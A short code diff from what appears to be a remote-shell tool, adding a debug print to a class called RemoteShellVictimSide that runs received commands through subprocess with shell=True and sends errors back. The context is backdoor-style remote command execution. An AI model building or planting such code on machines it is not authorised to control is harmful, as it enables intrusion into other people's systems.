@@ -89,6 +89,7 @@ class RemoteShellVictimSide:
             print(f"running {command} on subprocess")
             try:
                 result = subprocess.run(command, timeout=30, shell=True ,capture_output=True)
+                print(f"runed {command}")
             except Exception as e:
                 self.__send_output((str(e) + '\n').encode())
             else:
